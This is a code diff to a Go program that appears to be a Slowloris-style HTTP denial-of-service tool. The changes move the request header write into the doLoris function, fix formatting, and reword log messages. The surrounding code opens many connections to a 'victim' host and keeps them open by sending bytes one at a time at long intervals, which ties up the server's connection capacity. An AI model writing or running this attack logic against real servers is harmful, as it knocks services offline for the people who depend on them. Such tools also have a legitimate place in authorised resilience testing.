@@ -38,7 +38,7 @@ var (
 
 func main() {
 	flag.Parse()
-	flag.VisitAll(func (f *flag.Flag) {
+	flag.VisitAll(func(f *flag.Flag) {
 		fmt.Printf("%s=%v\n", f.Name, f.Value)
 	})
 
@@ -74,15 +74,9 @@ func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri
 	for {
 		time.Sleep(*rampUpInterval)
 		conn := dialVictim(victimHostPort, isTls)
-		if conn == nil {
-			continue
+		if conn != nil {
+			go doLoris(conn, victimUri, activeConnectionsCh, requestHeader)
 		}
-		if _, err := conn.Write(requestHeader); err != nil {
-			log.Printf("Error writing request header: [%s]\n", err)
-			continue
-		}
-		activeConnectionsCh <- 1
-		go doLoris(conn, victimUri, activeConnectionsCh)
 	}
 }
 
@@ -124,11 +118,20 @@ func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 	return tlsConn
 }
 
-func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int) {
-	defer func() { activeConnectionsCh <- -1 }()
+func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int, requestHeader []byte) {
 	defer conn.Close()
+
+	if _, err := conn.Write(requestHeader); err != nil {
+		log.Printf("Cannot write requestHeader=[%v]: [%s]\n", requestHeader, err)
+		return
+	}
+
+	activeConnectionsCh <- 1
+	defer func() { activeConnectionsCh <- -1 }()
+
 	readerStopCh := make(chan int, 1)
 	go nullReader(conn, readerStopCh)
+
 	for i := 0; i < *contentLength; i++ {
 		select {
 		case <-readerStopCh:
@@ -136,7 +139,7 @@ func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh ch
 		case <-time.After(*sleepInterval):
 		}
 		if _, err := conn.Write(sharedWriteBuf); err != nil {
-			log.Printf("Error when writing byte number %d of out %d: [%s]\n", i, *contentLength, err)
+			log.Printf("Error when writing %d byte out of %d bytes: [%s]\n", i, *contentLength, err)
 			return
 		}
 	}
@@ -146,7 +149,7 @@ func nullReader(conn io.Reader, ch chan<- int) {
 	defer func() { ch <- 1 }()
 	n, err := conn.Read(sharedReadBuf)
 	if err != nil {
-		log.Printf("Error when reading HTTP response: [%s]\n", err)
+		log.Printf("Error when reading server response: [%s]\n", err)
 	} else {
 		log.Printf("Unexpected response read from server: [%s]\n", sharedReadBuf[:n])
 	}
